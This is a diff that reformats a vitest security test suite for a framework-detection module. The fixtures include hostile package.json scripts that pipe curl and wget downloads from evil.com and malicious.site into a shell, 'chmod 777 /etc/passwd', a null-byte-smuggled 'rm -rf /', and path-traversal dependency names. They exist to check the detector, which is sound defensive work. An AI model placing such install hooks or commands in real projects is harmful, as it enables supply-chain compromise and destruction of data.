@@ -3,14 +3,14 @@
  * Comprehensive security vulnerability testing and validation
  */
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
-import { join } from 'path';
-import { tmpdir } from 'os';
-import { mkdir, writeFile, rm } from 'fs/promises';
+import { mkdir, rm, writeFile } from 'node:fs/promises';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import {
   DANGEROUS_SCRIPT_PATTERNS,
+  detectFrameworkSecurely,
   SUSPICIOUS_DEPENDENCY_PATTERNS,
-  detectFrameworkSecurely
 } from '../../../core/foundation/security/framework.js';
 
 describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
@@ -24,7 +24,9 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
   });
 
   afterEach(async () => {
-    try { await rm(testDir, { recursive: true }); } catch {}
+    try {
+      await rm(testDir, { recursive: true });
+    } catch {}
   });
 
   describe('1. ReDoS (Regular Expression Denial of Service) Vulnerabilities', () => {
@@ -32,21 +34,21 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
       // Test DANGEROUS_SCRIPT_PATTERNS for ReDoS
       const pathologicalInputs = [
         // Nested quantifiers that could cause exponential backtracking
-        'sudo ' + 'a'.repeat(10000),
-        'rm -rf' + ' '.repeat(5000) + '/',
-        'chmod 777' + ' '.repeat(5000) + 'file',
-        'eval(' + ')'.repeat(5000),
-        'nohup' + ' '.repeat(5000) + '&'
+        `sudo ${'a'.repeat(10000)}`,
+        `rm -rf${' '.repeat(5000)}/`,
+        `chmod 777${' '.repeat(5000)}file`,
+        `eval(${')'.repeat(5000)}`,
+        `nohup${' '.repeat(5000)}&`,
       ];
 
       pathologicalInputs.forEach((input) => {
         const start = Date.now();
-        
+
         // Test all dangerous script patterns
-        DANGEROUS_SCRIPT_PATTERNS.forEach(pattern => {
+        DANGEROUS_SCRIPT_PATTERNS.forEach((pattern) => {
           pattern.test(input);
         });
-        
+
         const duration = Date.now() - start;
         expect(duration).toBeLessThan(1000); // Should complete within 1 second
       });
@@ -56,17 +58,17 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
       const maliciousInputs = [
         'a'.repeat(10000), // Long string
         '1a2b3c4d5e'.repeat(1000), // Pattern: /[0-9]+[a-z]+[0-9]+/
-        'evil-' + 'x'.repeat(5000), // Pattern: /^evil-|^malicious-|^hack-/i
-        'backdoor' + 'x'.repeat(5000) // Pattern: /backdoor|trojan|virus|malware/i
+        `evil-${'x'.repeat(5000)}`, // Pattern: /^evil-|^malicious-|^hack-/i
+        `backdoor${'x'.repeat(5000)}`, // Pattern: /backdoor|trojan|virus|malware/i
       ];
 
-      maliciousInputs.forEach(input => {
+      maliciousInputs.forEach((input) => {
         const start = Date.now();
-        
-        SUSPICIOUS_DEPENDENCY_PATTERNS.forEach(pattern => {
+
+        SUSPICIOUS_DEPENDENCY_PATTERNS.forEach((pattern) => {
           pattern.test(input);
         });
-        
+
         const duration = Date.now() - start;
         expect(duration).toBeLessThan(500); // Fast pattern matching
       });
@@ -84,13 +86,10 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
       const largePackageJson = {
         name: 'large-project',
         dependencies: largeDeps,
-        scripts: {}
+        scripts: {},
       };
 
-      await writeFile(
-        join(testDir, 'package.json'),
-        JSON.stringify(largePackageJson)
-      );
+      await writeFile(join(testDir, 'package.json'), JSON.stringify(largePackageJson));
 
       // Should handle without memory exhaustion
       const result = await detectFrameworkSecurely(testDir);
@@ -107,13 +106,10 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
       const maliciousPackage = {
         name: 'nested-project',
         config: deepObject,
-        dependencies: { react: '^18.0.0' }
+        dependencies: { react: '^18.0.0' },
       };
 
-      await writeFile(
-        join(testDir, 'package.json'),
-        JSON.stringify(maliciousPackage)
-      );
+      await writeFile(join(testDir, 'package.json'), JSON.stringify(maliciousPackage));
 
       // Should not crash from deeply nested objects
       const result = await detectFrameworkSecurely(testDir);
@@ -137,18 +133,19 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
       `;
 
       await writeFile(join(testDir, 'next.config.js'), maliciousConfig);
-      await writeFile(join(testDir, 'package.json'), JSON.stringify({
-        name: 'malicious-next',
-        dependencies: { next: '^14.0.0' }
-      }));
+      await writeFile(
+        join(testDir, 'package.json'),
+        JSON.stringify({
+          name: 'malicious-next',
+          dependencies: { next: '^14.0.0' },
+        })
+      );
 
       const result = await detectFrameworkSecurely(testDir);
-      
+
       // Should detect the malicious eval pattern
       expect(result?.security.isSecure).toBe(false);
-      expect(result?.security.violations.some(v => 
-        v.type === 'script-injection'
-      )).toBe(true);
+      expect(result?.security.violations.some((v) => v.type === 'script-injection')).toBe(true);
     });
 
     it('should handle null byte injection in config paths', async () => {
@@ -157,17 +154,14 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
         name: 'null-byte-project',
         dependencies: { next: '^14.0.0' },
         scripts: {
-          build: `echo "test" > /tmp/test\0rm -rf /`
-        }
+          build: `echo "test" > /tmp/test\0rm -rf /`,
+        },
       };
 
-      await writeFile(
-        join(testDir, 'package.json'),
-        JSON.stringify(maliciousPackage)
-      );
+      await writeFile(join(testDir, 'package.json'), JSON.stringify(maliciousPackage));
 
       const result = await detectFrameworkSecurely(testDir);
-      
+
       // Should detect dangerous script patterns
       expect(result?.buildConfig.security.hasSafeCommands).toBe(false);
     });
@@ -178,20 +172,17 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
       const typosquattingPackage = {
         name: 'typosquat-project',
         dependencies: {
-          'reactt': '^18.0.0', // Typosquatting 'react'
-          'loadsh': '^4.17.0', // Typosquatting 'lodash'
-          'expresss': '^4.18.0', // Typosquatting 'express'
-          'evil-react': '^1.0.0' // Malicious prefix
-        }
+          reactt: '^18.0.0', // Typosquatting 'react'
+          loadsh: '^4.17.0', // Typosquatting 'lodash'
+          expresss: '^4.18.0', // Typosquatting 'express'
+          'evil-react': '^1.0.0', // Malicious prefix
+        },
       };
 
-      await writeFile(
-        join(testDir, 'package.json'),
-        JSON.stringify(typosquattingPackage)
-      );
+      await writeFile(join(testDir, 'package.json'), JSON.stringify(typosquattingPackage));
 
       const result = await detectFrameworkSecurely(testDir);
-      
+
       // Should flag suspicious dependencies
       expect(result?.dependencies.security.hasSuspiciousDeps).toBe(true);
       expect(result?.dependencies.suspicious).toContain('evil-react');
@@ -203,17 +194,14 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
         dependencies: {
           '../../../etc/passwd': '^1.0.0',
           'package\nwith\nnewlines': '^1.0.0',
-          'package with spaces': '^1.0.0'
-        }
+          'package with spaces': '^1.0.0',
+        },
       };
 
-      await writeFile(
-        join(testDir, 'package.json'),
-        JSON.stringify(dangerousPackage)
-      );
+      await writeFile(join(testDir, 'package.json'), JSON.stringify(dangerousPackage));
 
       const result = await detectFrameworkSecurely(testDir);
-      
+
       // Should handle dangerous dependency names gracefully
       expect(result).toBeDefined();
     });
@@ -222,20 +210,23 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
   describe('5. Race Condition Vulnerabilities', () => {
     it('should handle concurrent detection calls safely', async () => {
       // Create a valid project
-      await writeFile(join(testDir, 'package.json'), JSON.stringify({
-        name: 'concurrent-test',
-        dependencies: { react: '^18.0.0' }
-      }));
-
-      // Run multiple concurrent detection calls
-      const promises = Array(10).fill(0).map(() => 
-        detectFrameworkSecurely(testDir)
+      await writeFile(
+        join(testDir, 'package.json'),
+        JSON.stringify({
+          name: 'concurrent-test',
+          dependencies: { react: '^18.0.0' },
+        })
       );
 
+      // Run multiple concurrent detection calls
+      const promises = Array(10)
+        .fill(0)
+        .map(() => detectFrameworkSecurely(testDir));
+
       const results = await Promise.all(promises);
-      
+
       // All should return consistent results
-      results.forEach(result => {
+      results.forEach((result) => {
         expect(result?.name).toBeDefined();
         expect(result?.dependencies.trusted).toContain('react');
       });
@@ -243,10 +234,13 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
 
     it('should handle file system race conditions', async () => {
       // Create package.json
-      await writeFile(join(testDir, 'package.json'), JSON.stringify({
-        name: 'race-test',
-        dependencies: { next: '^14.0.0' }
-      }));
+      await writeFile(
+        join(testDir, 'package.json'),
+        JSON.stringify({
+          name: 'race-test',
+          dependencies: { next: '^14.0.0' },
+        })
+      );
 
       // Start framework detection
       const detectionPromise = detectFrameworkSecurely(testDir);
@@ -254,10 +248,13 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
       // Simultaneously modify the file
       setTimeout(async () => {
         try {
-          await writeFile(join(testDir, 'package.json'), JSON.stringify({
-            name: 'modified-race-test',
-            dependencies: { vue: '^3.0.0' }
-          }));
+          await writeFile(
+            join(testDir, 'package.json'),
+            JSON.stringify({
+              name: 'modified-race-test',
+              dependencies: { vue: '^3.0.0' },
+            })
+          );
         } catch {}
       }, 10);
 
@@ -270,26 +267,23 @@ describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
   describe('6. Configuration Tampering Detection', () => {
     it('should detect suspicious script modifications', async () => {
       // Small delay to ensure previous test's setTimeout operations have completed
-      await new Promise(resolve => setTimeout(resolve, 50));
-      
+      await new Promise((resolve) => setTimeout(resolve, 50));
+
       const tamperedPackage = {
         name: 'tampered-project',
         dependencies: { next: '^14.0.0' },
         scripts: {
           // Legitimate looking but dangerous
-          'postinstall': 'node scripts/setup.js && curl -s https://evil.com/malware.sh | bash',
-          'prepare': 'husky install && wget -qO- https://malicious.site/backdoor | sh',
-          'build': 'next build && sudo chmod 777 /etc/passwd'
-        }
+          postinstall: 'node scripts/setup.js && curl -s https://evil.com/malware.sh | bash',
+          prepare: 'husky install && wget -qO- https://malicious.site/backdoor | sh',
+          build: 'next build && sudo chmod 777 /etc/passwd',
+        },
       };
 
-      await writeFile(
-        join(testDir, 'package.json'),
-        JSON.stringify(tamperedPackage)
-      );
+      await writeFile(join(testDir, 'package.json'), JSON.stringify(tamperedPackage));
 
       const result = await detectFrameworkSecurely(testDir);
-      
+
       // Should detect multiple dangerous patterns
       expect(result).toBeDefined();
       expect(result?.buildConfig).toBeDefined();
